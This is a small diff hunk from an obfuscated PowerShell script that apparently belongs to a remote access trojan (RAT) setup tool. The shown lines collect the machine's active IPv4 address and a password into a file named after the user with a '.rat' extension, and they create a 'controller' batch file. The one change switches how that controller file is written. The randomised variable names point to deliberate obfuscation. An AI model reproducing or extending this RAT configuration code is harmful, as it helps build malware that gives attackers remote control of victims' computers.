@@ -38,7 +38,7 @@ $QLxOhYDbSkv = Get-Content .\QqXjYbeWZoUhT.txt
 $rtsRfiZBxpGP = "$env:username.rat"
 $LcghRQwiJbdINVyFY = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
 #generate controller file
-Add-Content -Path "$fXmtFxsAMdGw\meuqSoQyrCUvhGjpV.cmd" -Value "@echo off"
+Set-Content -Path "$fXmtFxsAMdGw\meuqSoQyrCUvhGjpV.cmd" -Value "@echo off"
 # generate config file
 Add-Content -Path $rtsRfiZBxpGP -Value $LcghRQwiJbdINVyFY   #ip
 Add-Content -Path $rtsRfiZBxpGP -Value $OIRXhsDHFU          #pass
